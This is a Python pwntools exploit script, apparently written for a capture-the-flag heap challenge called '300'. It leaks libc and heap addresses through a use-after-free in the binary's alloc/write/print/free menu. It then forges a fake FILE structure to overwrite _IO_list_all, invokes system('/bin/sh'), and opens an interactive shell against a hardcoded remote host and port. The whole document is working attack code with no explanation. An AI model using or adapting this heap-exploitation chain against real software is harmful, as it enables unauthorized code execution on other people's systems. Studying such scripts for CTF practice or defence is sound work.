from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./300"
LIBC = "./libc.so.6"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
# context.log_level = 'debug'

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil("4) free\n")

def alloc(conn, slot):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvline()
    conn.sendline(str(slot))

def write_it(conn, slot, s):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvline()
    conn.sendline(str(slot))
    conn.send(s)

def print_it(conn, slot):
    recvmenu(conn)
    conn.sendline("3")
    conn.recvline()
    conn.sendline(str(slot))
    return conn.recvuntil("\n1) alloc")[:-len("\n1) alloc")]

def free_it(conn, slot):
    recvmenu(conn)
    conn.sendline("4")
    conn.recvline()
    conn.sendline(str(slot))

def exploit(conn, elf, libc, local):
    local = False
    if local:
        ubin_off = 0x3c4b78
    else:
        ubin_off = 0x3c1b58

    alloc(conn, 0)
    alloc(conn, 1)
    alloc(conn, 2)
    alloc(conn, 3)
    free_it(conn, 2)
    leak = u64(print_it(conn, 2).ljust(8, "\x00"))
    libc.address = leak - ubin_off
    log.info("%#x", libc.address)

    free_it(conn, 0)
    leak = u64(print_it(conn, 0).ljust(8, "\x00"))
    heapbase = leak - 0x620
    log.info("%#x", heapbase)

    # reset everything
    free_it(conn, 1)
    free_it(conn, 3)

    alloc(conn, 0)
    alloc(conn, 1)
    free_it(conn, 0)

    payload = ""
    payload += p64(libc.address + ubin_off)
    payload += p64(heapbase + 0x50)
    payload += "A"*0x30
    payload += p64(0)
    payload += p64(0x311)
    payload += p64(heapbase)
    payload += p64(libc.address + ubin_off)
    write_it(conn, 0, payload)

    alloc(conn, 0)
    alloc(conn, 2)

    """ old stuff
    # myshit
    # free_it(conn, 1)

    # payload = ""
    # payload += "A" * (0x310 - 0x60)
    # payload += p64(0)
    # payload += p64(0xcf1)
    # write_it(conn, 2, payload)
    # pause()
    # for _ in range(5):
    #     alloc(conn, 1)
    """

    alloc(conn, 3)
    free_it(conn, 1)

    payload = ""
    payload += "\x00" * (0x310 - 0x60)
    payload += p64(0)
    payload += p64(0x61)
    write_it(conn, 2, payload)

    payload = ""
    payload += p64(0) * 8
    payload += p64(0)
    payload += p64(0x91)
    payload += p64(0) * 16
    payload += p64(0)
    payload += p64(0x21) * 5
    write_it(conn, 0, payload)
    free_it(conn, 2)

    payload = ""
    payload += p64(libc.address + ubin_off)
    payload += p64(libc.symbols['_IO_list_all'] - 0x10)
    # write_it(conn, 1, payload)

    # alloc(conn, 1)

    # payload = ""
    # payload += p64(0)
    # payload += p64(0)
    payload += p64(0)
    payload += p64(next(libc.search("/bin/sh")))
    payload += p64(0) * 2
    payload += p64((next(libc.search("/bin/sh")) - 100) / 2)
    payload += p64(0) * 18
    payload += p64(libc.address + 0x3be4c0)
    payload += p64(libc.symbols['system'])
    write_it(conn, 1, payload)

    alloc(conn, 8)
    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("104.199.25.43", 1337)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=False)# True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
